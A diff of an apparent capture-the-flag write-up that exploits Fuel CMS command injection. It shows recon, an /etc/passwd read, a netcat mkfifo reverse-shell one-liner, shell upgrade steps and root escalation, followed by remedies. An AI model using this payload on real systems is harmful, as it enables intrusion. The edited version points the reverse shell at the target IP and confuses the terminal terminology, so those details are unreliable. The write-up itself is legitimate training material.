@@ -12,11 +12,11 @@ We get to see some directory paths. It shows the service and version used (Fuel 
 <img width="1166" height="605" alt="Ignite2" src="https://github.com/user-attachments/assets/6ba7a916-9b55-4dd5-8415-26cff22e185b" />
 
 
-2. Running Nmap shows that port 80 is open on which Apache httpd 2.4.18 is running.
+2. Running "nmap -sV <TARGET_IP>" shows that port 80 is open on which Apache httpd 2.4.18 is running.
 <img width="670" height="180" alt="Ignite3" src="https://github.com/user-attachments/assets/46aad0e5-17cd-48d4-bf74-926132c94ff7" />
 
 
-3. Now I'll use feroxbuster in order to find hidden directories. It is returning a directory /fuel/login.
+3. Now I'll use Feroxbuster in order to find hidden directories. It is returning a directory /fuel/login.
 <img width="1135" height="582" alt="Ignite4" src="https://github.com/user-attachments/assets/d33a6df1-0497-4fbb-a308-452f6533e382" />
 
 
@@ -35,19 +35,18 @@ We also cross checked on our search engine whether our target is vulnerable to C
 
 2. Now, I'll use the link given by nuclei to exploit the vulnerability.
 In the link, we can see that there is a part in which Linux command has been used along with URL encoding (cat%20/etc/passwd).
-This can mean that the vulnerability is "Command Injection", but the output is not shown on the screen which means that this is "Blind Command Injection".
-To verify that, we can try using ping command which causes the website to load late.
+This can mean that the vulnerability is "Remote Code Execution", but the output is not shown on the screen.
 <img width="1533" height="608" alt="Ignite7" src="https://github.com/user-attachments/assets/83b6fe17-083e-4a62-ba55-1ef62d603e42" />
 
 
-3. If we can inject commmands in the URL, we can also inject payloads to establish reverse shell.
-Firstly, I used netcat to listen on port 1234. Then I picked up an online available netcat payload for reverse shell (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 1234 >/tmp/f).
+3. If we can inject commands in the URL, establishing reverse shell is also possible because of RCE.
+Firstly, I used netcat to listen on port 1234. Then I used an online available netcat payload for reverse shell (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <TARGET_IP> 1234 >/tmp/f).
 Then I used CyberChef to URL encode it. After injecting it, we get a shell.
 <img width="1533" height="557" alt="Ignite9" src="https://github.com/user-attachments/assets/516bdc0d-76f7-4762-a5c1-a5d51949d35f" />
 
 
-4. We got the shell, but is not fully functional.
-In order to make it fully functional we run the command:- script -qc /bin/bash /dev/null.
+4. We got the shell, but it is Pseudo Terminal.
+In order to make it TTY we run the command:- script -qc /bin/bash /dev/null.
 Then we background the session using "ctrl+z".
 Then we run the command:- stty raw -echo; fg. "raw" prevents Local processing i.e. Preventing the termination of session by ctrl+c, ctr+z.
 "-echo" disables local echoing, thereby preventing duplicated or scrambled characters.
@@ -72,8 +71,14 @@ I navigated it and found password for root. Due to this, I gained root access. I
 
 <img width="442" height="114" alt="Ignite15" src="https://github.com/user-attachments/assets/b54322cc-0fc5-4b3d-bba0-84c60a1bb67f" />
 
-# What I learnt:-
+# What did I learn:-
 
-1. Websites should always use up-to-date version of services.
-2. User input shouldn't be run without proper sanitization in order to prevent attacks like Command Injection.
-3. Passwords shouldn't be stored in files which are accessible to everyone.
+* Examining a Website thoroughly before performing tests. This benefitted me by revealing the service used by target
+* Encoding the payloads can make URL based RCE possible.
+* We need to have Fully Functional Terminal to do certain things which a Pseudo Terminal can't(ex. logging in as a root)
+
+# Remedies:-
+
+* Websites should always use up-to-date version of services.
+*  User input shouldn't be run without proper sanitization in order to prevent attacks like Remote Code Execution.
+* Passwords shouldn't be stored in files which are accessible to everyone.
